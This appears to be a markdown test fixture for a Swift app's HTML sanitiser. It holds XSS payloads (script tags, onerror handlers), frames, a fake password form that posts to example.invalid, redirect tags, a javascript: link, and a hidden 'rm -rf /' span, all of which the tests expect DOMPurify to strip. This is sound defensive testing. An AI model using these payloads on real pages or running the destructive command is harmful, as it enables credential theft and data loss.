# Inline HTML that must not survive rendering

CommonMark passes raw HTML through, and `EscapingHTMLFormatter` honours that
deliberately — see its `visitHTMLBlock` / `visitInlineHTML`. Nothing in the
Swift layer strips any of the markup below. DOMPurify, configured in
`MarkdownHTML+HostBridge.swift`, is the only thing standing between this
document and the reader.

`SanitizerNegativeTests` renders this file through the real pipeline and asserts
that none of it survives. If a merge weakens `SANITIZE_CONFIG`, drops the
DOMPurify bundle, or reintroduces a code path that writes to `innerHTML` without
sanitising, those tests fail.

**Reading this by eye:** each section below states what you should see. The
whole file passes when every EXPECT holds. Sanitisation removes elements
without leaving a gap, so **most sections should look empty** — an empty
section is the passing result here, not a rendering failure.

## Script execution

> **EXPECT:** nothing at all between this note and the next heading.
> **FAIL IF:** you see any text, box or broken-image placeholder here.
> Scripts cannot show themselves, so absence is the only visible evidence —
> `SanitizerNegativeTests` is what proves they did not *run*.

<script>window.__pwned = true;</script>

<img src="x" onerror="window.__pwned = true;">

<svg><script>window.__pwned = true;</script></svg>

## Framed and embedded content

> **EXPECT:** nothing between this note and the next heading.
> **FAIL IF:** you see an inset panel, a bordered rectangle, a plugin
> placeholder, or a "cannot be displayed" message — any of those means the
> frame element survived and tried to load.

<iframe src="https://example.invalid/frame"></iframe>

<object data="https://example.invalid/object"></object>

<embed src="https://example.invalid/embed">

## Credential harvesting

> **EXPECT:** nothing between this note and the next heading.
> **FAIL IF:** you see a password box or a **Sign in** button. That is the
> whole test: if a text field and a button appear, a document you merely
> opened is able to ask you for a password and post it to a server. Seeing
> them means this build must not be used.

<form action="https://example.invalid/collect" method="post">
  <input name="password" type="password">
  <button type="submit">Sign in</button>
</form>

## Document-level hijacking

> **EXPECT:** nothing between this note and the next heading, and the page
> stays put.
> **FAIL IF:** the preview navigates away, goes blank, or reloads by itself.
> These tags rewrite where the page's links point and can redirect the whole
> document to another site.

<base href="https://example.invalid/">

<meta http-equiv="refresh" content="0; url=https://example.invalid/">

<link rel="stylesheet" href="https://example.invalid/style.css">

## Scripted URLs

> **EXPECT:** the words *Looks like a link* appear as **plain text, not a
> link** — no colour, no underline, nothing to click.
> **FAIL IF:** it renders as a clickable link. The sanitiser is supposed to
> drop the `href` and leave the text behind.

[Looks like a link](javascript:window.__pwned=true)

## Visual deception against the copy button

The `style` attribute is stripped specifically so a hidden segment cannot ride
along in `textContent` when a reader copies a code block.

> **This section inverts the others — here you SHOULD see something.**
>
> **EXPECT:** the text `rm -rf /` is **visible** directly below. It was
> authored as hidden; the sanitiser strips the `style` attribute, which
> unhides it. Seeing it is the pass.
> **FAIL IF:** it is missing. Invisible means `style="display:none"` survived,
> and text you cannot see could ride along into your clipboard when you copy
> a code block.
>
> **EXPECT:** the rest of this page is still visible.
> **FAIL IF:** the page is blank below here — that means the `<style>` block
> survived and applied `body { display: none }` to the whole document.

<span style="display:none">rm -rf /</span>

<style>body { display: none; }</style>
